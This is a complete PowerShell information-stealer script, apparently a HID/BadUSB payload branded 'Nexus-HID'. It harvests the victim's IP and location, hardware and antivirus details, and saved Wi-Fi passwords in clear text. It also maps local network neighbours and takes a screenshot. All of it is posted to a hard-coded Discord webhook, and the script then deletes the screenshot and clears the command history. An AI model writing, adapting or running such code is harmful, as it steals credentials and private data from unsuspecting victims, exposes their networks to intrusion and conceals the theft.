# --- CONFIGURATION ---
$WEBHOOK = "https://discord.com/api/webhooks/1481790664013512774/aFcyihxEknHXmDUtZIOH36pmZQrcBhAbYbH3d8uAHuwpDKOjD7NEtKiS_Wy6FuUTK0dY"
$SCREENSHOT_PATH = "$env:TEMP\sys_log.png"

# --- NETWORK INFO ---
try {
    $IPInfo = Invoke-RestMethod ipinfo.io/json
    $PublicIP = $IPInfo.ip
    $City = $IPInfo.city
    $ISP = $IPInfo.org
} catch {
    $PublicIP = "Unknown"; $City = "Unknown"; $ISP = "Unknown"
}

# --- HARDWARE & OS ---
$OS = (Get-CimInstance Win32_OperatingSystem).Caption
$CPU = (Get-CimInstance Win32_Processor).Name
$RAM = "$([Math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB)) GB"
$Bat = Get-CimInstance -ClassName Win32_Battery -ErrorAction SilentlyContinue
$BatStatus = if($Bat){ "$($Bat.EstimatedChargeRemaining)% (Battery)" } else { "Desktop / AC Power" }

# --- SECURITY & APPS ---
$AV = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName
$TopProcs = (Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 -ExpandProperty Name) -join ", "

# --- WIFI & LOCAL NETWORK (Sanitized Strings) ---
$WiFiRaw = netsh wlan show prof | Select-String ':\s+(.+)$' | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $pass = netsh wlan show prof name=$name key=clear | Select-String 'Key Content\s+:\s+(.+)$' | ForEach-Object { $_.Matches.Groups[1].Value }
    if($pass){ "[$name]: $pass" }
} | Out-String

$LocalMapRaw = arp -a | Select-String "dynamic" | Select-Object -First 5 | Out-String

# Pre-format code blocks to avoid hash table errors
$WiFiFinal = if(![string]::IsNullOrWhiteSpace($WiFiRaw)){ "```" + $WiFiRaw.Trim() + "```" } else { "```No Keys Found```" }
$NetFinal = if(![string]::IsNullOrWhiteSpace($LocalMapRaw)){ "```" + $LocalMapRaw.Trim() + "```" } else { "```No Neighbors Found```" }

# --- SCREENSHOT ---
try {
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $S = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $B = New-Object System.Drawing.Bitmap($S.Width,$S.Height)
    $G = [System.Drawing.Graphics]::FromImage($B)
    $G.CopyFromScreen(0,0,0,0,$B.Size)
    $B.Save($SCREENSHOT_PATH, [System.Drawing.Imaging.ImageFormat]::Png)
    $G.Dispose(); $B.Dispose()
} catch {}

# --- STYLED DISCORD EMBED ---
$Payload = @{
    embeds = @(@{
        title = "--- NEXUS ELITE SYSTEM EXTRACTION ---"
        description = "Advanced system metrics and network mapping completed."
        color = 2829619
        footer = @{ text = "Nexus-HID | Protocol 1.2 | $(Get-Date -Format 'HH:mm:ss')" }
        fields = @(
            @{ name = "Target Identity"; value = "User: **$env:USERNAME**`nPC: **$env:COMPUTERNAME**`nOS: $OS"; inline = $false }
            @{ name = "Network Info"; value = "IP: $PublicIP`nCity: $City`nISP: $ISP"; inline = $true }
            @{ name = "Hardware Stats"; value = "CPU: $CPU`nRAM: $RAM`nPower: $BatStatus"; inline = $true }
            @{ name = "Security Status"; value = "AV: **$AV**"; inline = $false }
            @{ name = "Top Processes (CPU)"; value = "``$TopProcs``"; inline = $false }
            @{ name = "Saved WiFi Networks"; value = $WiFiFinal; inline = $false }
            @{ name = "Local Network Neighbors"; value = $NetFinal; inline = $false }
        )
    })
}

$Json = $Payload | ConvertTo-Json -Depth 4
Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $Json -ContentType 'application/json'

# --- FILE UPLOAD ---
if (Test-Path $SCREENSHOT_PATH) {
    curl.exe -F "file=@$SCREENSHOT_PATH" $WEBHOOK
    Remove-Item $SCREENSHOT_PATH
}

Clear-History
exit
